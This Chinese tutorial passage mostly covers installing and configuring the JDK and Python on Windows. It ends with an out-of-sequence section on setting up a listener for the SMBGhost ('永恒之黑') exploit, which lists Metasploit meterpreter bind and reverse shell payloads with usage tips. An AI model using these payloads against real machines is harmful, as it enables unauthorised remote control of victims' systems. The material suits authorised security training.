二、环境搭建与永恒之黑漏洞（28）

1. JDK环境搭建

1.1 JDK环境安装

进入JDK下载官网之后，首页出现的是目前最新的JDK版本，也可选择常用的jdk8

如果需要下载以前的JDK版本，就需要点击【Java archive】， 在这里就可以找到JDK之前的所有版本

选择好自己所需要的JDK版本之后，选择和操作系统一致版本的JDK，下载解压后安装，进行下一步即可

1.2 JDK环境变量

​ 完成jdk安装以后则需对，配置PATH环境变量的目的是，能够在任何地方使用编译工具（javac）和运行工具（java）。PATH环境变量

的值就应该是javac和java工具所在的目录路径，即JDK bin目录

打开系统中的高级系统设置，点开高级，然后进入环境变量

选择下面的系统变量，进行新建

输入变量名JAVA_HOME，变量值根据自己的jdk的安装路径填写为JDK的bin目录所在路径。注意不用带bin，下面是笔者的安装目录

在系统变量里新建”classpath”变量，变量值为：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;

找到path变量（已存在不用新建）添加变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin

Windows+R&->输入&cmd&->Enter，输入java -version(记得中间有个空格)，如果显示jdk版本信息就说明环境变量配置成功了

2. Python环境搭建

python是一个跨平台，可以在的编程语言，因此可在Windows，linux和mac os x系统中安装使用。安装完成后，你会得到python解释器

环境，可以通过终端输入python命令查看本地是否已经安装python已经python版本。这里有一个点需要注意的是，如果没有将python的

安装目录添加到环境变量中，会报错（python不是内部命令或外部命令，也不是可执行程序）。需要把python安装环境添加到环境变量

中。

2.1 Python下载与安装

下载路径

python官网：https://www.python.org/

python文档地址：https://www.python.org/doc/

进入官网点击Downloads选择Windows

下载自己所需python版本

2.2 Python安装

下载完成后，找到安装包，双击打开点击运

勾选左下角Add python 3.6 to PATH，然后选择第二个自定义安装（Customize installation）

以下默认即可，点击next（下一步）

选择自定义安装路径

等待进度条安装完毕即可

完成后，通过Win+R输入cmd进入命令行，输入python，即安装成功

2.3 注意事项

1.安装路径不要有中文

2.一定要知道安装到了哪里

3.add python 3.6to PATH 自动添加到环境变量

4.mac系统自带python2，所以要需要通过python3进入交互环境

1.2 开启监听模式

该漏洞反弹shell具有概率性，如果单次未成功请重复一下步骤，或者重新开始

bind_tcp

path : payload/windows/meterpreter/bind_tcp

正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST

reverse_tcp

path : payload/windows/meterpreter/reverse_tcp

反向连接shell,使用起来很稳定。需要设置LHOST

reverse_http/https

path:payload/windows/meterpreter/reverse_http/https

通过http/https的方式反向连接，在网速慢的情况下不稳定，https如果反弹没有收到数据，可以将监听端口换成443试试
